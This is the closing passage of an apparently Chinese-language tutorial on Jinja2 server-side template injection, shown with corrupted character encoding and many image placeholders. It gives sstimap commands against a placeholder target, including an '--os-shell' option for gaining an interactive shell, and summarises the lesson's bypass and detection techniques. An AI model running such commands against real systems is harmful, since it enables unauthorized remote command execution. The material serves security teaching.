    *   tplmapçš„ç»§ä»»è€…ï¼ŒåŠŸèƒ½æ›´å¼ºï¼Œæ”¯æŒæ›´å¤šå¼•æ“å’Œç»•è¿‡ã€‚
    *   ä½¿ç”¨Python3ã€‚
    *   ä½¿ç”¨ç¤ºä¾‹ï¼š
        ```bash
        python3 sstimap.py -u 'http://target.com/page' --data 'name=test'
        python3 sstimap.py -u 'http://target.com/page?name=test' --os-shell
        ```
    *    `--os-shell` å‚æ•°å¯ä»¥å°è¯•è·å–ä¸€ä¸ªäº¤äº’å¼å‘½ä»¤è¡Œã€‚

![](img/4f35c1213d1007e26878f35f72713efc_385.png)

![](img/4f35c1213d1007e26878f35f72713efc_387.png)

![](img/4f35c1213d1007e26878f35f72713efc_389.png)

![](img/4f35c1213d1007e26878f35f72713efc_391.png)

![](img/4f35c1213d1007e26878f35f72713efc_393.png)

![](img/4f35c1213d1007e26878f35f72713efc_395.png)

![](img/4f35c1213d1007e26878f35f72713efc_397.png)

![](img/4f35c1213d1007e26878f35f72713efc_399.png)

**å·¥å…·å±€é™æ€§**ï¼šè‡ªåŠ¨åŒ–å·¥å…·å¯èƒ½æ— æ³•å¤„ç†å¤æ‚çš„è¿‡æ»¤å’Œç»•è¿‡åœºæ™¯ï¼Œæ­¤æ—¶éœ€è¦ç»“åˆæ‰‹åŠ¨åˆ†æï¼Œè¿ç”¨å‰é¢æåˆ°çš„ç»•è¿‡æŠ€å·§æ¥æ„é€ payloadã€‚

![](img/4f35c1213d1007e26878f35f72713efc_401.png)

![](img/4f35c1213d1007e26878f35f72713efc_403.png)

![](img/4f35c1213d1007e26878f35f72713efc_405.png)

![](img/4f35c1213d1007e26878f35f72713efc_407.png)

![](img/4f35c1213d1007e26878f35f72713efc_409.png)

![](img/4f35c1213d1007e26878f35f72713efc_411.png)

![](img/4f35c1213d1007e26878f35f72713efc_413.png)

![](img/4f35c1213d1007e26878f35f72713efc_415.png)

## æ€»ç»“
æœ¬èŠ‚è¯¾æˆ‘ä»¬ä¸€èµ·æ·±å…¥å­¦ä¹ äº†Python Jinja2å¼•æ“çš„SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_417.png)

![](img/4f35c1213d1007e26878f35f72713efc_419.png)

![](img/4f35c1213d1007e26878f35f72713efc_421.png)

![](img/4f35c1213d1007e26878f35f72713efc_423.png)

*   **æˆ‘ä»¬ç†è§£äº†SSTIçš„åŸç†**ï¼šç”±äºç”¨æˆ·è¾“å…¥è¢«ä¸å®‰å…¨åœ°åµŒå…¥æ¨¡æ¿å¹¶è§£ææ‰§è¡Œã€‚
*   **æˆ‘ä»¬æŒæ¡äº†åˆ©ç”¨æµç¨‹**ï¼šä»æ¢æµ‹ç±»ã€å¯»æ‰¾ç´¢å¼•åˆ°æœ€ç»ˆè°ƒç”¨å±é™©æ–¹æ³•æ‰§è¡Œå‘½ä»¤ã€‚
*   **æˆ‘ä»¬å­¦ä¹ äº†å¤šç§ç»•è¿‡æŠ€å·§**ï¼šåº”å¯¹æ•°å­—ã€å¼•å·ã€å…³é”®å­—ã€ç‚¹å·ã€ä¸‹åˆ’çº¿ç­‰è¿‡æ»¤ã€‚
*   **æˆ‘ä»¬äº†è§£äº†é»‘ç›’æ£€æµ‹æ–¹æ³•**ï¼šé€šè¿‡å¯»æ‰¾å›æ˜¾ç‚¹å’Œä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·è¿›è¡Œé«˜æ•ˆæ¢æµ‹ã€‚

![](img/4f35c1213d1007e26878f35f72713efc_425.png)

![](img/4f35c1213d1007e26878f35f72713efc_427.png)

![](img/4f35c1213d1007e26878f35f72713efc_429.png)

![](img/4f35c1213d1007e26878f35f72713efc_431.png)

![](img/4f35c1213d1007e26878f35f72713efc_433.png)

![](img/4f35c1213d1007e26878f35f72713efc_435.png)

![](img/4f35c1213d1007e26878f35f72713efc_437.png)

![](img/4f35c1213d1007e26878f35f72713efc_439.png)

![](img/4f35c1213d1007e26878f35f72713efc_441.png)

è™½ç„¶Python Webåº”ç”¨åœ¨å®æˆ˜ä¸­å æ¯”ç›¸å¯¹PHP/Javaè¾ƒå°‘ï¼Œä½†SSTIä½œä¸ºä¸€ç±»ç»å…¸çš„æœåŠ¡å™¨ç«¯æ¼æ´ï¼Œåœ¨CTFå’Œä»£ç å®¡è®¡ä¸­ä»å…·æœ‰é‡è¦æ„ä¹‰ã€‚ç†è§£å…¶åŸç†å’Œåˆ©ç”¨æ–¹å¼ï¼Œæœ‰åŠ©äºæå‡æ•´ä½“Webå®‰å…¨æ”»é˜²èƒ½åŠ›ã€‚